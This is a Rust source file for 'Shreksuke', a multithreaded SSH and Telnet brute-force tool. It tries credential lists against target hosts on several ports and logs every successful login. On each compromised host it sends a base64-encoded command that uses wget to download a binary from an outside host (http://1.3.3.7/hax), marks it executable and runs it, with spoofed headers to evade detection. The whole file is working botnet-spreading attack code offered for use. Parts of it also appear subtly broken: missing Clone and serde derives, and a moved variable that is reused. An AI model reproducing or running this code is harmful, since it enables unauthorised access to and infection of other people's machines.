use std::io::{self, BufRead, BufReader, Write};
use std::time::{Duration, Instant};
use std::fs::{File, OpenOptions};
use std::sync::{Arc, Mutex};
use std::net::ToSocketAddrs;
use std::collections::HashSet;
use std::thread;
use std::sync::atomic::{AtomicUsize, AtomicBool, Ordering};

use telnet::{Telnet, Event};
use ssh2::Session;
use crossbeam_channel::{bounded, Sender, Receiver};
use indicatif::{ProgressBar, ProgressStyle, MultiProgress};
use clap::{App, Arg};

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(2);
const DEFAULT_RATE_LIMIT: usize = 10; // attempts per second
const DEFAULT_THREADS: usize = 20;
const MAX_RETRIES: u32 = 2;

struct Config {
    ssh_enabled: bool,
    telnet_enabled: bool,
    timeout: Duration,
    rate_limit: usize,
    threads: usize,
    resume: bool,
    ssh_ports: Vec<u16>,
    telnet_ports: Vec<u16>,
    target_file: String,
    user_file: String,
    pass_file: String,
    wget_url: String,
    wget_filename: String,
}

struct Stats {
    total_attempts: AtomicUsize,
    successful_logins: AtomicUsize,
    failed_attempts: AtomicUsize,
    active_threads: AtomicUsize,
    start_time: Instant,
}

impl Stats {
    fn new() -> Self {
        Self {
            total_attempts: AtomicUsize::new(0),
            successful_logins: AtomicUsize::new(0),
            failed_attempts: AtomicUsize::new(0),
            active_threads: AtomicUsize::new(0),
            start_time: Instant::now(),
        }
    }
    
    fn print(&self) {
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let attempts = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_logins.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let active = self.active_threads.load(Ordering::Relaxed);
        let rate = if elapsed > 0.0 { attempts as f64 / elapsed } else { 0.0 };
        
        println!("\n=== Statistics ===");
        println!("Elapsed: {:.2}s", elapsed);
        println!("Total Attempts: {}", attempts);
        println!("Successful: {} ({:.2}%)", success, 
                 if attempts > 0 { success as f64 * 100.0 / attempts as f64 } else { 0.0 });
        println!("Failed: {}", failed);
        println!("Active Threads: {}", active);
        println!("Rate: {:.2} attempts/sec", rate);
        println!("==================\n");
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Banner
    print_banner();
    
    // Parse command line arguments
    let matches = App::new("Shreksuke")
        .version("4.20")
        .author("Shrek")
        .about("Advanced multi-protocol brute force tool")
        .arg(Arg::with_name("ssh")
            .short("s")
            .long("ssh")
            .help("Enable SSH brute forcing"))
        .arg(Arg::with_name("telnet")
            .short("t")
            .long("telnet")
            .help("Enable Telnet brute forcing"))
        .arg(Arg::with_name("timeout")
            .long("timeout")
            .value_name("SECONDS")
            .help("Connection timeout in seconds")
            .default_value("2"))
        .arg(Arg::with_name("rate")
            .short("r")
            .long("rate")
            .value_name("RATE")
            .help("Maximum attempts per second")
            .default_value("10"))
        .arg(Arg::with_name("threads")
            .short("j")
            .long("threads")
            .value_name("THREADS")
            .help("Number of worker threads")
            .default_value("20"))
        .arg(Arg::with_name("resume")
            .long("resume")
            .help("Resume from checkpoint"))
        .arg(Arg::with_name("targets")
            .short("T")
            .long("targets")
            .value_name("FILE")
            .help("Target IPs file")
            .required(true))
        .arg(Arg::with_name("users")
            .short("U")
            .long("users")
            .value_name("FILE")
            .help("Usernames file")
            .required(true))
        .arg(Arg::with_name("passwords")
            .short("P")
            .long("passwords")
            .value_name("FILE")
            .help("Passwords file")
            .required(true))
        .arg(Arg::with_name("url")
            .long("url")
            .value_name("URL")
            .help("Wget download URL")
            .default_value("http://1.3.3.7/hax"))
        .arg(Arg::with_name("output")
            .long("output")
            .value_name("FILENAME")
            .help("Output filename for wget")
            .default_value("hax"))
        .get_matches();
    
    // Load config
    let config = Config {
        ssh_enabled: matches.is_present("ssh"),
        telnet_enabled: matches.is_present("telnet"),
        timeout: Duration::from_secs(matches.value_of("timeout").unwrap().parse()?),
        rate_limit: matches.value_of("rate").unwrap().parse()?,
        threads: matches.value_of("threads").unwrap().parse()?,
        resume: matches.is_present("resume"),
        ssh_ports: vec![22, 2222, 10001, 50000],
        telnet_ports: vec![23, 2323, 4000, 5560],
        target_file: matches.value_of("targets").unwrap().to_string(),
        user_file: matches.value_of("users").unwrap().to_string(),
        pass_file: matches.value_of("passwords").unwrap().to_string(),
        wget_url: matches.value_of("url").unwrap().to_string(),
        wget_filename: matches.value_of("output").unwrap().to_string(),
    };
    
    // Validate at least one protocol is enabled
    if !config.ssh_enabled && !config.telnet_enabled {
        println!("[ERROR] Must enable at least one protocol (--ssh or --telnet)");
        std::process::exit(1);
    }
    
    // Load wordlists
    println!("[INFO] Loading wordlists...");
    let targets = load_lines(&config.target_file)?;
    let users = load_lines(&config.user_file)?;
    let passwords = load_lines(&config.pass_file)?;
    
    if targets.is_empty() || users.is_empty() || passwords.is_empty() {
        println!("[ERROR] One or more wordlists are empty");
        std::process::exit(1);
    }
    
    println!("[INFO] Loaded {} targets, {} users, {} passwords", 
             targets.len(), users.len(), passwords.len());
    
    // Calculate total combos
    let ssh_combos = if config.ssh_enabled { 
        targets.len() * users.len() * passwords.len() * config.ssh_ports.len()
    } else { 0 };
    
    let telnet_combos = if config.telnet_enabled { 
        targets.len() * users.len() * passwords.len() * config.telnet_ports.len()
    } else { 0 };
    
    let total_combos = ssh_combos + telnet_combos;
    println!("[INFO] Total combinations to try: {}", total_combos);
    
    if total_combos == 0 {
        println!("[ERROR] No combinations to test");
        std::process::exit(1);
    }
    
    // Create checkpoint if resuming
    let checkpoint_file = "checkpoint.json";
    let mut checkpoint = if config.resume && std::path::Path::new(checkpoint_file).exists() {
        println!("[INFO] Resuming from checkpoint...");
        load_checkpoint(checkpoint_file)?
    } else {
        Checkpoint::new()
    };
    
    // Setup stats
    let stats = Arc::new(Stats::new());
    let stats_clone = Arc::clone(&stats);
    
    // Create progress bar
    let pb = ProgressBar::new(total_combos as u64);
    pb.set_style(ProgressStyle::default_bar()
        .template("[{elapsed_precise}] {bar:40.cyan/blue} {pos:>7}/{len:7} {msg}")
        .progress_chars("##-"));
    
    // Create channel for jobs
    let (tx, rx) = bounded::<Job>(1000);
    let stop_signal = Arc::new(AtomicBool::new(false));
    
    // Spawn job producer
    let producer_tx = tx.clone();
    let config_clone = config.clone();
    let targets_clone = targets.clone();
    let users_clone = users.clone();
    let passwords_clone = passwords.clone();
    let checkpoint_clone = checkpoint.clone();
    
    thread::spawn(move || {
        produce_jobs(
            &producer_tx,
            &config_clone,
            &targets_clone,
            &users_clone,
            &passwords_clone,
            &checkpoint_clone,
            &stop_signal,
        );
    });
    
    // Create worker threads
    let mut workers = Vec::new();
    for worker_id in 0..config.threads {
        let rx = rx.clone();
        let stats = Arc::clone(&stats);
        let config = config.clone();
        let pb = pb.clone();
        let stop_signal = Arc::clone(&stop_signal);
        
        workers.push(thread::spawn(move || {
            worker_loop(worker_id, rx, stats, config, pb, stop_signal);
        }));
    }
    
    // Handle Ctrl+C
    let stop_signal_clone = Arc::clone(&stop_signal);
    ctrlc::set_handler(move || {
        println!("\n[INFO] Interrupt received, shutting down gracefully...");
        stop_signal_clone.store(true, Ordering::SeqCst);
    })?;
    
    // Wait for all workers
    for worker in workers {
        let _ = worker.join();
    }
    
    pb.finish_with_message("Complete!");
    
    // Print final statistics
    stats_clone.print();
    
    // Save checkpoint
    save_checkpoint(checkpoint_file, &checkpoint)?;
    
    // Run post-exploitation
    println!("[INFO] Running post-exploitation phase...");
    run_post_exploitation(&config)?;
    
    Ok(())
}

fn print_banner() {
    println!();
    println!("#############################################################################");
    println!("#                                                                           #");
    println!("# ███████╗██╗  ██╗██████╗ ███████╗██╗  ██╗███████╗██╗   ██╗██╗  ██╗███████╗ #");
    println!("# ██╔════╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║ ██╔╝██╔════╝ #");
    println!("# ███████╗███████║██████╔╝█████╗  █████╔╝ ███████╗██║   ██║█████╔╝ █████╗   #");
    println!("# ╚════██║██╔══██║██╔══██╗██╔══╝  ██╔═██╗ ╚════██║██║   ██║██╔═██╗ ██╔══╝   #");
    println!("# ███████║██║  ██║██║  ██║███████╗██║  ██╗███████║╚██████╔╝██║  ██╗███████╗ #");
    println!("# ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ #");
    println!("#            SHREK IS BACK AND READY TO HACK THE FUCKING PLANET!            #");
    println!("#                                                                           #");
    println!("#############################################################################");
    println!();
}

#[derive(Debug, Clone)]
enum Job {
    Ssh {
        target: String,
        port: u16,
        user: String,
        password: String,
    },
    Telnet {
        target: String,
        port: u16,
        user: String,
        password: String,
    },
}

#[derive(Debug, Clone)]
struct Checkpoint {
    ssh_completed: HashSet<String>,
    telnet_completed: HashSet<String>,
}

impl Checkpoint {
    fn new() -> Self {
        Self {
            ssh_completed: HashSet::new(),
            telnet_completed: HashSet::new(),
        }
    }
    
    fn key(&self, protocol: &str, target: &str, port: u16, user: &str, password: &str) -> String {
        format!("{}:{}:{}:{}:{}", protocol, target, port, user, password)
    }
    
    fn is_completed(&self, protocol: &str, target: &str, port: u16, user: &str, password: &str) -> bool {
        let key = self.key(protocol, target, port, user, password);
        match protocol {
            "ssh" => self.ssh_completed.contains(&key),
            "telnet" => self.telnet_completed.contains(&key),
            _ => false,
        }
    }
    
    fn mark_completed(&mut self, protocol: &str, target: &str, port: u16, user: &str, password: &str) {
        let key = self.key(protocol, target, port, user, password);
        match protocol {
            "ssh" => { self.ssh_completed.insert(key); }
            "telnet" => { self.telnet_completed.insert(key); }
            _ => {}
        }
    }
}

fn produce_jobs(
    tx: &Sender<Job>,
    config: &Config,
    targets: &[String],
    users: &[String],
    passwords: &[String],
    checkpoint: &Checkpoint,
    stop_signal: &AtomicBool,
) {
    let mut jobs_produced = 0;
    
    for target in targets {
        for user in users {
            for password in passwords {
                // Check if we should stop
                if stop_signal.load(Ordering::Relaxed) {
                    return;
                }
                
                // SSH jobs
                if config.ssh_enabled {
                    for &port in &config.ssh_ports {
                        if !checkpoint.is_completed("ssh", target, port, user, password) {
                            let job = Job::Ssh {
                                target: target.clone(),
                                port,
                                user: user.clone(),
                                password: password.clone(),
                            };
                            
                            if tx.send(job).is_err() {
                                return; // Receiver dropped
                            }
                            jobs_produced += 1;
                            
                            // Rate limiting
                            if jobs_produced % config.rate_limit == 0 {
                                thread::sleep(Duration::from_millis(100));
                            }
                        }
                    }
                }
                
                // Telnet jobs
                if config.telnet_enabled {
                    for &port in &config.telnet_ports {
                        if !checkpoint.is_completed("telnet", target, port, user, password) {
                            let job = Job::Telnet {
                                target: target.clone(),
                                port,
                                user: user.clone(),
                                password: password.clone(),
                            };
                            
                            if tx.send(job).is_err() {
                                return; // Receiver dropped
                            }
                            jobs_produced += 1;
                            
                            // Rate limiting
                            if jobs_produced % config.rate_limit == 0 {
                                thread::sleep(Duration::from_millis(100));
                            }
                        }
                    }
                }
            }
        }
    }
    
    println!("[INFO] Produced {} jobs", jobs_produced);
}

fn worker_loop(
    worker_id: usize,
    rx: Receiver<Job>,
    stats: Arc<Stats>,
    config: Config,
    pb: ProgressBar,
    stop_signal: Arc<AtomicBool>,
) {
    stats.active_threads.fetch_add(1, Ordering::Relaxed);
    
    while !stop_signal.load(Ordering::Relaxed) {
        match rx.recv_timeout(Duration::from_millis(100)) {
            Ok(job) => {
                let result = match &job {
                    Job::Ssh { target, port, user, password } => {
                        attempt_ssh(target, *port, user, password, &config.timeout)
                    }
                    Job::Telnet { target, port, user, password } => {
                        attempt_telnet(target, *port, user, password, &config.timeout)
                    }
                };
                
                stats.total_attempts.fetch_add(1, Ordering::Relaxed);
                
                match result {
                    Ok(arch) => {
                        stats.successful_logins.fetch_add(1, Ordering::Relaxed);
                        log_success(&job, &arch);
                        
                        // Try to run payload
                        if let Err(e) = run_payload(&job, &config) {
                            println!("[WARN] Failed to run payload: {}", e);
                        }
                    }
                    Err(e) => {
                        stats.failed_attempts.fetch_add(1, Ordering::Relaxed);
                        log_failure(&job, &e);
                    }
                }
                
                pb.inc(1);
            }
            Err(_) => {
                // Timeout, check if we should exit
                if stop_signal.load(Ordering::Relaxed) {
                    break;
                }
            }
        }
    }
    
    stats.active_threads.fetch_sub(1, Ordering::Relaxed);
}

fn attempt_ssh(
    target: &str,
    port: u16,
    user: &str,
    password: &str,
    timeout: &Duration,
) -> Result<String, String> {
    let addr = format!("{}:{}", target, port);
    
    let tcp = match std::net::TcpStream::connect_timeout(
        &addr.parse().map_err(|e| format!("Parse error: {}", e))?,
        *timeout,
    ) {
        Ok(stream) => stream,
        Err(e) => return Err(format!("Connection failed: {}", e)),
    };
    
    let mut session = Session::new().map_err(|e| format!("Session creation failed: {}", e))?;
    session.set_tcp_stream(tcp);
    session.handshake().map_err(|e| format!("Handshake failed: {}", e))?;
    
    session.userauth_password(user, password)
        .map_err(|e| format!("Authentication failed: {}", e))?;
    
    let mut channel = session.channel_session()
        .map_err(|e| format!("Channel failed: {}", e))?;
    
    channel.exec("uname -m")
        .map_err(|e| format!("Command failed: {}", e))?;
    
    let mut output = String::new();
    channel.read_to_string(&mut output)
        .map_err(|e| format!("Read failed: {}", e))?;
    
    channel.close().map_err(|e| format!("Close failed: {}", e))?;
    channel.wait_close().map_err(|e| format!("Wait failed: {}", e))?;
    
    Ok(output.trim().to_string())
}

fn attempt_telnet(
    target: &str,
    port: u16,
    user: &str,
    password: &str,
    timeout: &Duration,
) -> Result<String, String> {
    let addr = format!("{}:{}", target, port);
    let socket_addr = addr.to_socket_addrs()
        .map_err(|e| format!("Resolution failed: {}", e))?
        .next()
        .ok_or_else(|| "No address found".to_string())?;
    
    let mut telnet = Telnet::connect_timeout(&socket_addr, 5000, *timeout)
        .map_err(|e| format!("Connection failed: {}", e))?;
    
    // Read initial prompt
    let _ = telnet.read_timeout(*timeout);
    
    // Send username
    telnet.write(format!("{}\n", user).as_bytes())
        .map_err(|e| format!("Write failed: {}", e))?;
    
    // Read password prompt
    let _ = telnet.read_timeout(*timeout);
    
    // Send password
    telnet.write(format!("{}\n", password).as_bytes())
        .map_err(|e| format!("Write failed: {}", e))?;
    
    // Check response
    match telnet.read_timeout(*timeout) {
        Ok(Event::Data(data)) => {
            let response = String::from_utf8_lossy(&data);
            if response.contains("Login incorrect") || response.contains("failed") {
                return Err("Authentication failed".to_string());
            }
            
            // Get architecture
            telnet.write(b"uname -m\n")
                .map_err(|e| format!("Command failed: {}", e))?;
            
            match telnet.read_timeout(*timeout) {
                Ok(Event::Data(data)) => {
                    let arch = String::from_utf8_lossy(&data).trim().to_string();
                    Ok(arch)
                }
                _ => Err("Failed to read architecture".to_string()),
            }
        }
        _ => Err("No response received".to_string()),
    }
}

fn log_success(job: &Job, arch: &str) {
    let (protocol, target, port, user, password) = match job {
        Job::Ssh { target, port, user, password } => ("SSH", target, port, user, password),
        Job::Telnet { target, port, user, password } => ("TELNET", target, port, user, password),
    };
    
    println!("[SUCCESS] {}://{}:{} | {}:{} | Arch: {}",
             protocol, target, port, user, password, arch);
    
    // Log to file
    let log_entry = format!("{},{},{},{},{},{}\n", 
                           protocol, target, port, user, password, arch);
    
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("success.log")
        .unwrap_or_else(|_| {
            println!("[ERROR] Failed to open success.log");
            std::process::exit(1);
        });
    
    let _ = file.write_all(log_entry.as_bytes());
}

fn log_failure(job: &Job, error: &str) {
    // Optionally log failures to a separate file
    // For now, just update progress bar
}

fn run_payload(job: &Job, config: &Config) -> Result<(), String> {
    let (target, port, user, password) = match job {
        Job::Ssh { target, port, user, password } => (target, port, user, password),
        Job::Telnet { target, port, user, password } => (target, port, user, password),
    };
    
    // Create wget command with evasion techniques
    let wget_cmd = format!(
        "wget --limit-rate=1m --no-check-certificate \
         --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
         --referer='https://www.google.com' \
         {} -O {} && chmod +x {} && ./{}",
        config.wget_url, config.wget_filename, 
        config.wget_filename, config.wget_filename
    );
    
    // Base64 encode to avoid special character issues
    let encoded_cmd = base64::encode(&wget_cmd);
    let full_cmd = format!("echo {} | base64 -d | bash\n", encoded_cmd);
    
    match job {
        Job::Ssh { .. } => {
            // Reconnect via SSH and run command
            let addr = format!("{}:{}", target, port);
            let tcp = std::net::TcpStream::connect(&addr)
                .map_err(|e| format!("Reconnect failed: {}", e))?;
            
            let mut session = Session::new()
                .map_err(|e| format!("Session failed: {}", e))?;
            session.set_tcp_stream(tcp);
            session.handshake()
                .map_err(|e| format!("Handshake failed: {}", e))?;
            
            session.userauth_password(user, password)
                .map_err(|e| format!("Auth failed: {}", e))?;
            
            let mut channel = session.channel_session()
                .map_err(|e| format!("Channel failed: {}", e))?;
            
            channel.exec(&full_cmd)
                .map_err(|e| format!("Exec failed: {}", e))?;
            
            println!("[PAYLOAD] Sent to {}:{}", target, port);
            Ok(())
        }
        Job::Telnet { .. } => {
            // Reconnect via Telnet and run command
            let addr = format!("{}:{}", target, port);
            let socket_addr = addr.to_socket_addrs()
                .map_err(|e| format!("Resolution failed: {}", e))?
                .next()
                .ok_or_else(|| "No address".to_string())?;
            
            let mut telnet = Telnet::connect_timeout(&socket_addr, 5000, config.timeout)
                .map_err(|e| format!("Connection failed: {}", e))?;
            
            // Login again
            let _ = telnet.read_timeout(config.timeout);
            telnet.write(format!("{}\n", user).as_bytes())?;
            let _ = telnet.read_timeout(config.timeout);
            telnet.write(format!("{}\n", password).as_bytes())?;
            let _ = telnet.read_timeout(config.timeout);
            
            // Send payload
            telnet.write(full_cmd.as_bytes())
                .map_err(|e| format!("Write failed: {}", e))?;
            
            println!("[PAYLOAD] Sent to {}:{}", target, port);
            Ok(())
        }
    }
}

fn run_post_exploitation(config: &Config) -> Result<(), Box<dyn std::error::Error>> {
    if !std::path::Path::new("success.log").exists() {
        println!("[INFO] No successful logins found, skipping post-exploitation");
        return Ok(());
    }
    
    println!("[INFO] Running post-exploitation on successful targets...");
    
    // Here you could add more sophisticated post-exploitation
    // like mass command execution, persistence, lateral movement, etc.
    
    Ok(())
}

fn load_lines(filename: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let file = File::open(filename)?;
    let reader = BufReader::new(file);
    let lines: Vec<String> = reader.lines().filter_map(|line| line.ok()).collect();
    Ok(lines)
}

fn load_checkpoint(filename: &str) -> Result<Checkpoint, Box<dyn std::error::Error>> {
    let content = std::fs::read_to_string(filename)?;
    let checkpoint: Checkpoint = serde_json::from_str(&content)?;
    Ok(checkpoint)
}

fn save_checkpoint(filename: &str, checkpoint: &Checkpoint) -> Result<(), Box<dyn std::error::Error>> {
    let content = serde_json::to_string_pretty(checkpoint)?;
    std::fs::write(filename, content)?;
    Ok(())
}

// Add to Cargo.toml dependencies:
// telnet = "0.5.0"
// ssh2 = "0.9"
// crossbeam-channel = "0.5"
// indicatif = "0.16"
// clap = "2.33"
// ctrlc = "3.2"
// serde = { version = "1.0", features = ["derive"] }
// serde_json = "1.0"
// base64 = "0.13"
